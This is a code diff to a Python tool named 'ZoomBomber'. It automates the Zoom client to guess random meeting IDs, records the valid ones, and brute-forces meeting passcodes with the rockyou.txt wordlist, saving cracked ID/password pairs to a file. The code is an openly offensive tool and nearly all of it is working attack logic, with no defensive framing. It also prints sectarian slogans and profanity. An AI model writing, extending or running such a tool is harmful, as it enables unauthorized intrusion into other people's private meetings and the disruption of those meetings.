@@ -20,6 +20,7 @@ class ZoomBomber:
         pyautogui.click(self.Windows_Button)
         pyautogui.typewrite('Zoom')
         pyautogui.press('enter')
+        pyautogui.press('enter')
         print(Fore.RED +'[+] Zoom Opened' + Fore.GREEN + '- Success')
         self.open_meeting = pyautogui.locateOnScreen('./Open_Meeting.png')
         print(f'Open Meeting Found on {self.open_meeting}')
@@ -49,9 +50,8 @@ class ZoomBomber:
             self.meeting_code = self.meeting_code + s
         print(self.meeting_code)
         return self.meeting_code
-    def check_link(self):
-        link = self.generate_link()
-        sleep(1)
+    def check_link(self, link):
+        # Checks the Link Passed
         try:
             join_again_case = pyautogui.locateOnScreen('./Open_Meeting.png')
             pyautogui.click(join_again_case)
@@ -64,7 +64,7 @@ class ZoomBomber:
         pyautogui.click(self.enter_meeting)
         pyautogui.typewrite(f'{link}')
         pyautogui.press('enter')
-        print(Back.WHITE + Fore.GREEN +'[+] Now Sleeping for 8 Seconds :)')
+        print(Fore.RED + Back.GREEN +'[+] Now Sleeping for 8 Seconds :)')
         sleep(8)
         try:
             self.invalid_loc = pyautogui.locateOnScreen('./Invalid_ID_Force.png')
@@ -78,11 +78,71 @@ class ZoomBomber:
                 ok_location = pyautogui.locateOnScreen('./Ok_Button.png')
                 pyautogui.click(ok_location)
                 return False
-            else:
-                print('[+] Correct Meeting ID Found - Failsafe unactivated')
-                with open('Zoom-Meetings.txt', 'a+') as f:
-                    f.write(f'{link}\n')
+
+        print('[+] Correct Meeting ID Found - Failsafe unactivated')
+        active_titles = pyautogui.getAllTitles()
+        if 'Enter meeting password' or 'meeting password' in active_titles:
+            with open('Zoom-Meetings.txt', 'a+') as f:
+                f.write(f'{link}:pswd\n')
                 return True
+
+        let_u_in = pyautogui.locateOnScreen('./Let-u-in.png')
+        if let_u_in != None:
+            with open('Zoom-Meetings.txt', 'a+') as f:
+                f.write(f'{link}:no_pswd\n')
+                return True
+    def brute_force_link(self, meeting_id, dict='./rockyou.txt'):
+        print('[+] Starting to BruteForce Meeting ID : ')
+        open_meeting_loc = pyautogui.locateOnScreen('./Open_Meeting.png')
+        pyautogui.click(open_meeting_loc)
+        self.enter_meeting = pyautogui.locateOnScreen('./Enter-Meeting.png')
+        pyautogui.click(self.enter_meeting)
+        pyautogui.typewrite(f'{meeting_id}')
+        pyautogui.press('enter')
+        if 'Enter meeting passcode' in pyautogui.getAllTitles():
+            Bruter = Figlet()
+            Bruter.renderText('Ottoman-Bruter')
+            print('[+] Sultan Abdul Hamid Han II - May God Almighty bless his soul and those martyrs who fought for the Caliphate Against the Young Turks and the Free Masons and Iluminati.')
+            print('[+] Ottoman Motto: Fight against those who Oppress and Protect those who are Oppressed from the Oppressors')
+            print('[+] Ottoman-Bruter Forcer Started')
+            if dict == './rockyou.txt':
+                print('[+] Using Default RockYou Password Dictionary [Fuck the Byzantines, aka. British]')
+            else:
+                print('[*] Remember Dict should be of the Format:\n guess1\nguess2\nguess3\n')
+            with open(dict, 'r', encoding='utf8', errors='ignore') as f:
+                guess = f.read()
+                self.guess = guess.split('\n')
+                print(f'Password Guesses Loaded: {len(self.guess)}')
+            let_u_in = pyautogui.locateOnScreen('./Let-u-in.png')
+            while let_u_in == None:
+                password_entry_location = pyautogui.locateOnScreen('./passcode.png')
+                if password_entry_location == None:
+                    print('[**] Strange Anomaly Detected there is no Password Entry Box on the Screen')
+                    print('[**] Please Bring it up on the Screen for the Program to Continue')
+                    while password_entry_location == None:
+                        password_entry_location = pyautogui.locateOnScreen('./passcode.png')
+                else:
+                    pyautogui.click(password_entry_location)
+
+                for password in self.guess:
+                    print(f'[?] Trying Password: {password}')
+                    pyautogui.typewrite(password)
+                    join_meeting_button = pyautogui.locateOnScreen('./join-meeting.png')
+                    pyautogui.click(join_meeting_button)
+                    sleep(8)
+                    check_fail_1 = pyautogui.locateOnScreen('./failed-attempt.png')
+                    if check_fail_1 == None:
+                        let_u_in = pyautogui.locateOnScreen('./Let-u-in.png')
+                        if let_u_in != None:
+                            print(f'[+] Password Found Now in Waiting Room - Password is {password} for ID {meeting_id}')
+                            with open('works.txt', 'a+') as f:
+                                f.write(f'{meeting_id}:{password}\n')
+                                break
+
+            print('Ottoman Brute Forcer Completed Execution')
+            print('Allah is the Greatest ....')
+
+
 
 
 
@@ -90,20 +150,11 @@ class ZoomBomber:
 
 if __name__ == '__main__':
     Bomber = ZoomBomber()
-    Status = False
-    while Status == False:
-
-        Status = Bomber.check_link()
-        if Status == False:
-            print('Attempt Failed')
-        if Status == True:
-            fail_safe = pyautogui.locateOnScreen('./Invalid_ID.png')
-            if fail_safe != None:
-                print(Fore.RED + Back.WHITE + "URGENT: FAILSAFE CONFIRMS IT IS NOT WORKING [BAD]")
-                Status = False
-            elif fail_safe == None:
-                print(Fore.RED + Back.WHITE + "URGENT: FAILSAFE CONFIRMS IT IS WORKING [GOOD]")
-
-
-
+    while True:
+        Link = Bomber.generate_link()
+        Link_Status = Bomber.check_link(Link)
+        if Link_Status == True:
+            print(f'[?] This Link Works {Link}')
+            print('[+] Stopping Code Execution Now')
+            Bomber.brute_force_link(Link)
 
